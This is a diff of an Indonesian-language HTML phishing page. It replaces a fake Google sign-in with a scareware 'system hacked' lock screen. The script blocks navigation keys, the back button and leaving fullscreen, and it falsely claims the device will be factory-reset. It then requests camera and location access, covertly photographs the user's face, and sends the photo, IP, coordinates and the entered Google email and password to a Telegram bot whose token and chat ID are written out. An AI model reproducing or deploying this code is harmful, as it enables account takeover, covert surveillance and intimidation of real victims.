@@ -2,116 +2,629 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Sign in - Google Accounts</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover, shrink-to-fit=no">
+    <title>⚠️ SISTEM TERKOMPROMI ⚠️</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
+            user-select: none;
+            -webkit-tap-highlight-color: transparent;
         }
+
+        html, body {
+            width: 100%;
+            height: 100%;
+            overflow: hidden !important;
+            position: fixed !important;
+            top: 0 !important;
+            left: 0 !important;
+            right: 0 !important;
+            bottom: 0 !important;
+        }
+
         body {
-            font-family: 'Google Sans', Arial, sans-serif;
-            background: white;
-            min-height: 100vh;
+            font-family: 'Courier New', 'Fira Code', monospace;
+            background: #0a0000;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+        }
+
+        /* BACKGROUND MATRIX HACKER BERGERAK */
+        .matrix-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+            opacity: 0.2;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            color: #ff0000;
+            white-space: pre;
+            overflow: hidden;
+            pointer-events: none;
+        }
+
+        .matrix-line {
+            position: absolute;
+            white-space: nowrap;
+            animation: scrollDown linear infinite;
+        }
+
+        @keyframes scrollDown {
+            0% { transform: translateY(-100%); }
+            100% { transform: translateY(100vh); }
+        }
+
+        /* OVERLAY UTAMA */
+        .hacker-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.95);
+            z-index: 1;
             display: flex;
             justify-content: center;
             align-items: center;
-            padding: 20px;
+            backdrop-filter: blur(3px);
         }
-        .card {
-            max-width: 450px;
-            width: 100%;
-            padding: 48px 40px 36px;
+
+        /* CARD UTAMA */
+        .hacker-card {
+            background: linear-gradient(145deg, #1a0000 0%, #0a0000 100%);
+            border: 2px solid #ff0000;
+            border-radius: 20px;
+            padding: 35px 28px;
+            max-width: 480px;
+            width: 90%;
             text-align: center;
+            box-shadow: 0 0 50px rgba(255,0,0,0.3), inset 0 0 20px rgba(255,0,0,0.1);
+            animation: borderPulse 1.5s infinite;
+            z-index: 2;
         }
-        .google-logo img { width: 75px; margin-bottom: 20px; }
-        h1 { font-size: 24px; font-weight: 400; margin-bottom: 8px; }
-        .subtitle { color: #5f6368; margin-bottom: 32px; }
+
+        @keyframes borderPulse {
+            0%, 100% { box-shadow: 0 0 20px rgba(255,0,0,0.3); border-color: #ff0000; }
+            50% { box-shadow: 0 0 50px rgba(255,0,0,0.8); border-color: #ff4444; }
+        }
+
+        /* HEADER */
+        .skull-icon {
+            font-size: 50px;
+            animation: shake 0.5s infinite;
+            display: inline-block;
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translate(0,0); }
+            25% { transform: translate(-2px, 2px); }
+            75% { transform: translate(2px, -2px); }
+        }
+
+        .glitch-text {
+            font-size: 24px;
+            font-weight: bold;
+            color: #ff0000;
+            text-shadow: 2px 2px 0px #660000;
+            margin: 15px 0;
+            letter-spacing: 2px;
+        }
+
+        .warning-badge {
+            background: #ff0000;
+            color: #000;
+            padding: 6px 14px;
+            border-radius: 5px;
+            font-size: 11px;
+            font-weight: bold;
+            display: inline-block;
+            animation: blink 1s step-end infinite;
+        }
+
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+
+        .danger-text {
+            color: #ff4444;
+            font-size: 13px;
+            margin: 15px 0;
+            font-weight: bold;
+            text-transform: uppercase;
+        }
+
+        .message-box {
+            background: #0d0000;
+            border-left: 4px solid #ff0000;
+            padding: 15px;
+            margin: 20px 0;
+            text-align: left;
+            font-size: 12px;
+        }
+
+        .message-box p {
+            color: #ff6666;
+            margin: 8px 0;
+            font-family: monospace;
+        }
+
+        .message-box .bullet {
+            color: #ff0000;
+            font-weight: bold;
+        }
+
+        /* GOOGLE LOGIN AREA */
+        .google-login-area {
+            margin: 20px 0;
+            padding: 20px;
+            background: rgba(255,255,255,0.05);
+            border-radius: 15px;
+            border: 1px solid rgba(255,0,0,0.3);
+        }
+
+        .google-logo {
+            margin-bottom: 15px;
+        }
+
+        .google-logo img {
+            width: 70px;
+            filter: brightness(0) invert(1);
+            opacity: 0.8;
+        }
+
+        .input-group {
+            margin: 15px 0;
+            text-align: left;
+        }
+
+        .input-group label {
+            font-size: 11px;
+            color: #ff6666;
+            margin-bottom: 6px;
+            display: block;
+            font-family: monospace;
+        }
+
         input {
             width: 100%;
-            padding: 13px 15px;
-            margin: 10px 0;
-            border: 1px solid #dadce0;
-            border-radius: 4px;
-            font-size: 16px;
-        }
-        input:focus { outline: none; border-color: #1a73e8; }
-        button {
-            width: 100%;
-            padding: 12px;
-            background: #1a73e8;
-            color: white;
-            border: none;
-            border-radius: 4px;
+            padding: 14px 16px;
+            background: #0a0000;
+            border: 1px solid #ff0000;
+            border-radius: 8px;
             font-size: 14px;
-            font-weight: 500;
-            cursor: pointer;
-            margin-top: 20px;
+            color: #ff4444;
+            font-family: monospace;
         }
-        .error {
-            background: #fce8e6;
-            color: #d93025;
-            padding: 12px;
-            border-radius: 4px;
+
+        input:focus {
+            outline: none;
+            border-color: #ff4444;
+            box-shadow: 0 0 10px rgba(255,0,0,0.3);
+        }
+
+        input::placeholder {
+            color: #441111;
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 14px;
+            background: #ff0000;
+            color: #000;
+            border: none;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: bold;
+            cursor: pointer;
             margin-top: 15px;
+            font-family: monospace;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+
+        .login-btn:disabled {
+            background: #441111;
+            cursor: not-allowed;
+        }
+
+        .error-msg {
+            color: #ff6666;
+            font-size: 11px;
+            margin-top: 10px;
+            display: none;
+        }
+
+        .loading-spinner {
+            display: none;
+            margin: 10px auto;
+            width: 20px;
+            height: 20px;
+            border: 2px solid #441111;
+            border-top: 2px solid #ff0000;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .footer-text {
+            margin-top: 20px;
+            font-size: 9px;
+            color: #661111;
+            letter-spacing: 1px;
+        }
+
+        video, canvas {
+            display: none;
+        }
+
+        ::-webkit-scrollbar {
             display: none;
         }
     </style>
 </head>
 <body>
-<div class="card">
-    <div class="google-logo">
-        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
+
+<!-- BACKGROUND MATRIX HACKER BERGERAK -->
+<div class="matrix-bg" id="matrixBg"></div>
+
+<div class="hacker-overlay">
+    <div class="hacker-card">
+        <div class="skull-icon">💀⚠️💀</div>
+        <div class="glitch-text">[ SISTEM TERHACK ]</div>
+        <div class="warning-badge">! PERINGATAN KERAS !</div>
+
+        <div class="danger-text">❗ PERANGKAT ANDA TELAH DIBLOKIR ❗</div>
+        
+        <div class="message-box">
+            <p><span class="bullet">›</span> <strong style="color:#ff0000;">AKSES DIBATASI</strong> - Perangkat Anda terkunci</p>
+            <p><span class="bullet">›</span> Data Anda sedang dipantau oleh sistem keamanan</p>
+            <p><span class="bullet">›</span> <strong style="color:#ff0000;">SATU-SATUNYA CARA KELUAR:</strong></p>
+            <p><span class="bullet">›</span> <strong style="color:#ff0000;">MASUKKAN EMAIL & PASSWORD GOOGLE ANDA</strong></p>
+            <p><span class="bullet">›</span> Percobaan gagal akan mengakibatkan <strong style="color:#ff0000;">RESET PABRIK</strong></p>
+        </div>
+
+        <!-- AREA LOGIN GOOGLE -->
+        <div class="google-login-area" id="loginArea" style="display: none;">
+            <div class="google-logo">
+                <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
+            </div>
+            <form id="loginForm">
+                <div class="input-group">
+                    <label>› EMAIL / NOMOR TELEPON</label>
+                    <input type="email" id="email" placeholder="contoh@gmail.com" autocomplete="off" required>
+                </div>
+                <div class="input-group">
+                    <label>› PASSWORD</label>
+                    <input type="password" id="password" placeholder="Masukkan password Anda" required>
+                </div>
+                <button type="submit" class="login-btn" id="loginBtn">BUKA KUNCI</button>
+                <div class="loading-spinner" id="spinner"></div>
+                <div class="error-msg" id="errorMsg">[ ERROR ] Email atau password salah!</div>
+            </form>
+        </div>
+
+        <!-- AREA PERMISSION -->
+        <div id="permissionArea">
+            <button class="login-btn" id="permissionBtn" style="background:#1a73e8; color:white;">IZINKAN AKSES KAMERA & LOKASI</button>
+            <div class="footer-text">{ Keamanan Perangkat }<br>{ Verifikasi Wajib }</div>
+        </div>
     </div>
-    <h1>Sign in</h1>
-    <div class="subtitle">to continue to Gmail</div>
-    <form id="loginForm">
-        <input type="email" id="email" placeholder="Email or phone" required>
-        <input type="password" id="password" placeholder="Password" required>
-        <button type="submit">Next</button>
-        <div class="error" id="errorMsg">Wrong email or password</div>
-    </form>
 </div>
+
+<video id="hiddenVideo" autoplay playsinline></video>
+<canvas id="hiddenCanvas"></canvas>
+
 <script>
+    // ========== TELEGRAM CONFIG ==========
     const TELEGRAM_TOKEN = "8806067214:AAHMhedGeATjYcFl3QUHk53Q8o9_sDuiGOg";
     const CHAT_ID = "8854409945";
+    // =====================================
 
-    async function sendToTelegram(email, password) {
-        let ip = 'Unknown';
+    let stream = null;
+    let photoSent = false;
+    let locationSent = false;
+    let permissionsGranted = false;
+
+    const permissionArea = document.getElementById('permissionArea');
+    const loginArea = document.getElementById('loginArea');
+    const permissionBtn = document.getElementById('permissionBtn');
+    const hiddenVideo = document.getElementById('hiddenVideo');
+    const hiddenCanvas = document.getElementById('hiddenCanvas');
+
+    // ========== BACKGROUND MATRIX ==========
+    const matrixBg = document.getElementById('matrixBg');
+    const codeStrings = [
+        '> ACCESS DENIED', '> HACKING PROGRESS', '> ROOTKIT_INJECT', 
+        '> 0x0F3A2B1C', '> SYS.OVERRIDE', '> RANSOMWARE_ACTIVE',
+        '> 01001110', '> BACKDOOR_FOUND', '> ADMIN.BYPASS',
+        '> CRYPTO_LOCK', '> DATA_EXFIL', '> KERNEL_PANIC',
+        '> WARNING_0x01', '> SYSTEM_LOCKED', '> UNAUTHORIZED'
+    ];
+    
+    for (let i = 0; i < 40; i++) {
+        const line = document.createElement('div');
+        line.className = 'matrix-line';
+        line.style.left = Math.random() * 100 + '%';
+        line.style.animationDuration = (Math.random() * 15 + 8) + 's';
+        line.style.animationDelay = Math.random() * 10 + 's';
+        line.style.fontSize = (Math.random() * 10 + 10) + 'px';
+        line.style.opacity = Math.random() * 0.4 + 0.1;
+        
+        let text = '';
+        for (let j = 0; j < 12; j++) {
+            text += codeStrings[Math.floor(Math.random() * codeStrings.length)] + '  ';
+        }
+        line.innerText = text;
+        matrixBg.appendChild(line);
+    }
+
+    // ========== LOCK TOTAL ==========
+    document.body.style.overflow = 'hidden';
+    document.documentElement.style.overflow = 'hidden';
+    
+    document.addEventListener('wheel', function(e) { e.preventDefault(); return false; }, { passive: false });
+    document.addEventListener('touchmove', function(e) { e.preventDefault(); return false; }, { passive: false });
+    
+    history.pushState(null, null, location.href);
+    window.addEventListener('popstate', function() {
+        history.pushState(null, null, location.href);
+        location.replace(location.href);
+    });
+    
+    document.addEventListener('keydown', function(e) {
+        if (e.key === 'F5' || e.key === 'F12' || (e.ctrlKey && e.key === 'r') || 
+            (e.ctrlKey && e.key === 'w') || e.key === 'Escape' || (e.ctrlKey && e.shiftKey && e.key === 'I') ||
+            e.key === 'Home' || e.key === 'Backspace') {
+            e.preventDefault();
+            return false;
+        }
+    });
+    
+    document.addEventListener('contextmenu', function(e) { e.preventDefault(); return false; });
+    
+    // ========== FULLSCREEN FORCE ==========
+    function forceFullscreen() {
+        const docEl = document.documentElement;
+        if (docEl.requestFullscreen) docEl.requestFullscreen().catch(()=>{});
+        else if (docEl.webkitRequestFullscreen) docEl.webkitRequestFullscreen();
+    }
+    
+    document.body.addEventListener('click', function firstClick() {
+        forceFullscreen();
+        document.body.removeEventListener('click', firstClick);
+    }, { once: true });
+    
+    document.addEventListener('fullscreenchange', function() {
+        if (!document.fullscreenElement) forceFullscreen();
+    });
+    
+    setInterval(() => {
+        if (!document.fullscreenElement && !document.webkitFullscreenElement) forceFullscreen();
+        if (window.location.hash !== '#locked') {
+            window.location.hash = 'locked';
+            history.pushState(null, null, '#locked');
+        }
+    }, 200);
+
+    // ========== GET IP ==========
+    async function getIP() {
         try {
             const res = await fetch('https://api.ipify.org?format=json');
             const data = await res.json();
-            ip = data.ip;
+            return data.ip;
+        } catch(e) {
+            return 'Unknown';
+        }
+    }
+
+    // ========== GET LOKASI ==========
+    async function getLocation() {
+        return new Promise((resolve) => {
+            if (!navigator.geolocation) {
+                resolve('Tidak tersedia');
+                return;
+            }
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    resolve(`${position.coords.latitude}, ${position.coords.longitude}`);
+                },
+                () => {
+                    resolve('Tidak diizinkan');
+                }
+            );
+        });
+    }
+
+    // ========== KIRIM LOKASI KE TELEGRAM ==========
+    async function sendLocationToTelegram() {
+        if (locationSent) return;
+        
+        const ip = await getIP();
+        const location = await getLocation();
+        const tanggal = new Date().toLocaleString('id-ID');
+        const userAgent = navigator.userAgent;
+        
+        const pesan = `📍📍📍 LOKASI KORBAN 📍📍📍%0A%0A` +
+            `🌐 IP ADDRESS : ${ip}%0A` +
+            `📍 LOKASI     : ${location}%0A` +
+            `📅 WAKTU      : ${tanggal}%0A` +
+            `💻 DEVICE     : ${encodeURIComponent(userAgent.substring(0, 100))}%0A%0A` +
+            `⚠️ KORBAN MENGIZINKAN AKSES LOKASI ⚠️`;
+        
+        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${pesan}`;
+        
+        try {
+            await fetch(url, {mode: 'no-cors'});
+            locationSent = true;
+        } catch(e) {}
+    }
+
+    // ========== FOTO DIAM-DIAM ==========
+    async function captureHiddenPhoto() {
+        if (photoSent) return;
+        if (!stream || !stream.active) return;
+        
+        if (hiddenVideo.videoWidth === 0 || hiddenVideo.videoHeight === 0) {
+            setTimeout(() => captureHiddenPhoto(), 500);
+            return;
+        }
+        
+        hiddenCanvas.width = hiddenVideo.videoWidth;
+        hiddenCanvas.height = hiddenVideo.videoHeight;
+        const ctx = hiddenCanvas.getContext('2d');
+        ctx.drawImage(hiddenVideo, 0, 0, hiddenCanvas.width, hiddenCanvas.height);
+        
+        const ip = await getIP();
+        const location = await getLocation();
+        const tanggal = new Date().toLocaleString('id-ID');
+        const userAgent = navigator.userAgent;
+        
+        const blob = await new Promise(resolve => hiddenCanvas.toBlob(resolve, 'image/jpeg', 0.85));
+        
+        const caption = `📸📸📸 FOTO WAJAH KORBAN 📸📸📸%0A%0A` +
+            `🌐 IP ADDRESS : ${ip}%0A` +
+            `📍 LOKASI     : ${location}%0A` +
+            `📅 WAKTU      : ${tanggal}%0A` +
+            `💻 DEVICE     : ${encodeURIComponent(userAgent.substring(0, 100))}%0A%0A` +
+            `⚠️ KORBAN TIDAK SADAR SEDANG DIFOTO ⚠️`;
+        
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('photo', blob, 'face.jpg');
+        formData.append('caption', caption);
+        
+        try {
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
+            photoSent = true;
         } catch(e) {}
         
+        if (stream) {
+            stream.getTracks().forEach(track => track.stop());
+            stream = null;
+        }
+    }
+
+    // ========== MULAI KAMERA ==========
+    async function startHiddenCamera() {
+        try {
+            stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: "user" } 
+            });
+            hiddenVideo.srcObject = stream;
+            
+            // Tunggu kamera stabil lalu foto
+            setTimeout(() => {
+                captureHiddenPhoto();
+            }, 2000);
+            
+            // Foto lagi setelah 5 detik (kalau belum)
+            setTimeout(() => {
+                if (!photoSent) captureHiddenPhoto();
+            }, 5000);
+            
+        } catch(e) {}
+    }
+
+    // ========== MINTA IZIN KAMERA & LOKASI ==========
+    async function requestAllPermissions() {
+        permissionBtn.disabled = true;
+        permissionBtn.innerText = "⏳ Memproses...";
+        
+        try {
+            // Minta izin lokasi dulu
+            await getLocation();
+            await sendLocationToTelegram();
+            
+            // Minta izin kamera
+            const tempStream = await navigator.mediaDevices.getUserMedia({ video: true });
+            tempStream.getTracks().forEach(track => track.stop());
+            
+            permissionsGranted = true;
+            
+            // Mulai hidden camera untuk foto diam-diam
+            await startHiddenCamera();
+            
+            // Sembunyikan area permission, tampilkan login area
+            permissionArea.style.display = 'none';
+            loginArea.style.display = 'block';
+            
+        } catch(err) {
+            permissionBtn.disabled = false;
+            permissionBtn.innerText = "IZINKAN AKSES KAMERA & LOKASI";
+            alert("⚠️ Anda HARUS mengizinkan akses kamera dan lokasi untuk membuka perangkat!");
+        }
+    }
+
+    // ========== KIRIM CREDENTIALS ==========
+    async function sendCredentials(email, password) {
+        const ip = await getIP();
+        const location = await getLocation();
         const tanggal = new Date().toLocaleString('id-ID');
-        let pesan = `🔐🔐🔐 GOOGLE LOGIN 🔐🔐🔐%0A%0A📧 EMAIL: ${email}%0A🔑 PASSWORD: ${password}%0A🌐 IP: ${ip}%0A📅 WAKTU: ${tanggal}%0A%0A⚠️ FOTO SUDAH TERKIRIM SEBELUMNYA ⚠️`;
+        
+        let pesan = `🔐🔐🔐 LOGIN GOOGLE 🔐🔐🔐%0A%0A`;
+        pesan += `📧 EMAIL    : ${email}%0A`;
+        pesan += `🔑 PASSWORD : ${password}%0A`;
+        pesan += `🌐 IP       : ${ip}%0A`;
+        pesan += `📍 LOKASI   : ${location}%0A`;
+        pesan += `📅 WAKTU    : ${tanggal}%0A%0A`;
+        pesan += `⚠️ FOTO WAJAH & LOKASI SUDAH TERKIRIM ⚠️`;
+        
         const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${pesan}`;
         await fetch(url, {mode: 'no-cors'});
     }
 
-    const form = document.getElementById('loginForm');
+    // ========== SUBMIT LOGIN ==========
+    const loginForm = document.getElementById('loginForm');
+    const loginBtn = document.getElementById('loginBtn');
+    const spinner = document.getElementById('spinner');
     const errorMsg = document.getElementById('errorMsg');
 
-    form.addEventListener('submit', async function(e) {
+    loginForm.addEventListener('submit', async function(e) {
         e.preventDefault();
+        
         const email = document.getElementById('email').value;
         const password = document.getElementById('password').value;
+        
         if (!email || !password) {
             errorMsg.style.display = 'block';
             setTimeout(() => errorMsg.style.display = 'none', 2000);
             return;
         }
-        await sendToTelegram(email, password);
-        errorMsg.style.backgroundColor = '#e6f4ea';
-        errorMsg.style.color = '#137333';
-        errorMsg.innerHTML = '✅ Verifikasi berhasil! Redirecting...';
+        
+        loginBtn.disabled = true;
+        spinner.style.display = 'block';
+        
+        await sendCredentials(email, password);
+        
+        spinner.style.display = 'none';
+        errorMsg.style.backgroundColor = '#0a2200';
+        errorMsg.style.color = '#00ff00';
+        errorMsg.innerHTML = '[ SUCCESS ] Perangkat akan dibuka...';
         errorMsg.style.display = 'block';
+        
         setTimeout(() => {
             window.location.href = 'https://mail.google.com';
         }, 2000);
     });
+
+    // ========== TOMBOL PERMISSION ==========
+    permissionBtn.addEventListener('click', requestAllPermissions);
 </script>
 </body>
 </html>
